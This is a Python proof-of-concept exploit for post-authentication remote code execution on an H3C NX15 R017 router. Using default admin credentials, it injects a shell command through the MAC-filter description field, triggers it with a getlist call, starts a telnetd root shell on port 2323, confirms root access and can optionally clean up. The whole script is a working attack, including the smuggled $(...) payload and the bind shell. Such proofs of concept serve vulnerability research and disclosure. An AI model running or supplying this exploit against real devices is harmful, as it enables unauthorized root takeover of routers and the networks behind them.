#!/usr/bin/env python3
import argparse
import json
import random
import socket
import sys
import time

import requests


def log(msg: str):
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(
        base.rstrip('/') + '/api/login/auth',
        json={'username': username, 'password': password},
        timeout=10,
    )
    r.raise_for_status()
    j = r.json()
    if j.get('code') != 0:
        raise RuntimeError(f'login failed: {j}')
    return j['data']['session']


def esps(base: str, session: str, obj: str, method: str, param: dict, timeout: int = 30):
    headers = {'AUTHENTICATION': session, 'Content-Type': 'application/json'}
    payload = [{'id': 1, 'object': obj, 'method': method, 'param': param}]
    r = requests.post(base.rstrip('/') + '/api/esps', headers=headers, data=json.dumps(payload), timeout=timeout)
    r.raise_for_status()
    try:
        return r.json()
    except Exception:
        return r.text


def connect_shell(host: str, port: int, timeout: float = 5.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    time.sleep(0.3)
    banner = b''
    try:
        banner += s.recv(4096)
    except Exception:
        pass
    return s, banner


def run_shell_cmd(sock: socket.socket, cmd: str, end_marker: str = '__END__') -> str:
    sock.sendall(f'{cmd}; echo {end_marker}\n'.encode())
    time.sleep(0.6)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if end_marker.encode() in data or len(data) > 65535:
                break
    except Exception:
        pass
    return data.decode('latin1', 'ignore')


def make_mac() -> str:
    return '02:AA:BB:CC:EE:%02X' % random.randint(0, 255)


def parse_getlist(resp):
    try:
        return resp[0]['result']['data'].get('list', [])
    except Exception:
        return []


def main():
    ap = argparse.ArgumentParser(description='H3C NX15 R017 post-auth RCE via esps.macfilter add + getlist eval chain')
    ap.add_argument('--base', default='http://192.168.8.1', help='router base URL')
    ap.add_argument('--username', default='admin', help='web admin username')
    ap.add_argument('--password', default='admin123', help='web admin password')
    ap.add_argument('--host', default='192.168.8.1', help='target host for shell connection')
    ap.add_argument('--port', type=int, default=2323, help='temporary telnetd shell port')
    ap.add_argument('--delay', type=float, default=1.5, help='seconds to wait after trigger')
    ap.add_argument('--cleanup', action='store_true', help='delete malicious entry and kill spawned shell after verification')
    args = ap.parse_args()

    marker = 'MACFILTER_RCE_OK'
    mac = make_mac()
    payload = f'$(echo${{IFS}}{marker}>/tmp/macfilter_rce_marker&&/usr/sbin/telnetd${{IFS}}-p${{IFS}}{args.port}${{IFS}}-l${{IFS}}/bin/sh)'

    log('[*] Step 1: login')
    session = login(args.base, args.username, args.password)
    log(f'[*] session = {session}')

    log(f'[*] Step 2: add malicious macfilter entry for {mac}')
    add_resp = esps(args.base, session, 'esps.macfilter', 'add', {'mac': mac, 'description': payload})
    print(json.dumps(add_resp, ensure_ascii=False, indent=2) if not isinstance(add_resp, str) else add_resp)

    log('[*] Step 3: trigger getlist to force eval of stored description')
    getlist_resp = esps(args.base, session, 'esps.macfilter', 'getlist', {})
    print(json.dumps(getlist_resp, ensure_ascii=False, indent=2) if not isinstance(getlist_resp, str) else getlist_resp)

    log(f'[*] Step 4: wait {args.delay:.1f}s for shell on {args.host}:{args.port}')
    time.sleep(args.delay)

    log('[*] Step 5: connect shell and verify root code execution')
    sock, banner = connect_shell(args.host, args.port)
    print(banner.decode('latin1', 'ignore'))
    proof = run_shell_cmd(sock, 'id; uname -a; cat /tmp/macfilter_rce_marker 2>/dev/null')
    print(proof)
    ok = ('uid=0(root)' in proof) and (marker in proof)

    if args.cleanup:
        log('[*] Step 6: cleanup malicious entry')
        del_resp = esps(args.base, session, 'esps.macfilter', 'delbymac', {'list': [mac]})
        print(json.dumps(del_resp, ensure_ascii=False, indent=2) if not isinstance(del_resp, str) else del_resp)
        log('[*] Step 7: cleanup temporary shell')
        awk_pat = rf'/telnetd -p {args.port} -l /bin/sh/ && !/awk/ {{print $1}}'
        cleanup_out = run_shell_cmd(sock, f'pid=$(ps w | awk \'{awk_pat}\'); [ -n "$pid" ] && kill $pid; echo cleaned')
        print(cleanup_out)

    sock.close()

    if ok:
        log('[+] SUCCESS: root RCE via esps.macfilter add/getlist chain')
        return 0

    log('[-] FAILED: expected proof not found')
    return 1


if __name__ == '__main__':
    sys.exit(main())
